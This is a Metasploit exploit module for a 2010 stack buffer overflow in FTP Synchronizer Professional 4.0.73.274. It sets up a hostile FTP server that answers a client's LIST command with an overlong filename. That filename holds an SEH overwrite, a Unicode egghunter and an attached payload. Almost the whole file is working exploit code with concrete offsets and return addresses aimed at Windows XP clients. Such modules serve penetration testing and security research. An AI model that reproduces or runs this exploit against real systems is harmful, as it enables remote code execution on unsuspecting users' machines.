##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Exploit::Remote::FtpServer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'FTP Synchronizer Professional 4.0.73.274 Stack Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack buffer overflow vulnerability in FTP Synchronizer Pro
        version 4.0.73.274 The overflow gets triggered by sending an overly long filename to
        the client in response to a LIST command.
        The LIST command gets issued when doing a preview or when you have just created a new
        sync profile and allow the tool to see the differences.
        This will overwrite a structured exception handler and trigger an access violation.
      },
      'Author' 	 =>
        [
          'myne-us',  	#found the bug
          'corelanc0d3r <peter.ve[at]corelan.be>'	#wrote the exploit
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/' ],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Payload'        =>
        {
          'BadChars' => "\x00\x0a\x2f\x5c",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'XP Universal', { 'Offset' => 854, 'Ret' => "\x2D\x78" } ], # p/p/r FTPSynchronizer.exe
        ],
      'Privileged'     => false,
      'DisclosureDate' => '2010-10-12',
      'DefaultTarget'  => 0))
  end

  def setup
    super
  end

  def on_client_unknown_command(c,cmd,arg)
    c.put("200 OK\r\n")
  end

  def on_client_command_list(c,arg)
    conn = establish_data_connection(c)
    if(not conn)
      c.put("425 Can't build data connection\r\n")
      return
    end
    print_status(" - Data connection set up")
    code = 150
    c.put("#{code} Here comes the directory listing.\r\n")
    code = 226
    c.put("#{code} Directory send ok.\r\n")
    totalsize = 4000
    foldername = "A" *  target['Offset']
    nseh = "\x61\x42"
    seh = "\x2D\x78"
    sehpad = "\x44\x62"
    align = "\x53\x62\x58\x62"
    align << "\x40\x62"
    align << "\x05\x11\x10\x62"
    align << "\x2d\x10\x10\x62"
    padding = ("\x42\x62" * 53) + ("\x48\x62")
    #basereg EAX, Unicode encoded egghunter
    hunter = "PPYAIAIAIAIAQATAXAZAPA3QADAZ"
    hunter << "ABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAX"
    hunter << "A58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABA"
    hunter << "BAB30APB944JBQVE1HJKOLOPB0RBJLBQHHMNNOLM5PZ4"
    hunter << "4JO7H2WP0P0T4TKZZFOSEZJ6OT5K7KO9WA"
    buffer = foldername + nseh + seh + sehpad + align + padding + hunter
    junk = "D" * (totalsize-buffer.length)
    buffer << junk
    print_status(" - Sending directory list via data connection")
    dirlist =  "drwxrwxrwx    1 100      0           11111 Jun 11 21:10 #{"w00tw00t"+payload.encoded}\r\n"
    dirlist << "-rw-rw-r--    1 1176     1176         1060 Aug 16 22:22 #{buffer}\r\n"
    conn.put("total 2\r\n"+dirlist)
    print_status(" - Payload sent, wait for hunter...")
    conn.close
    return
  end
end
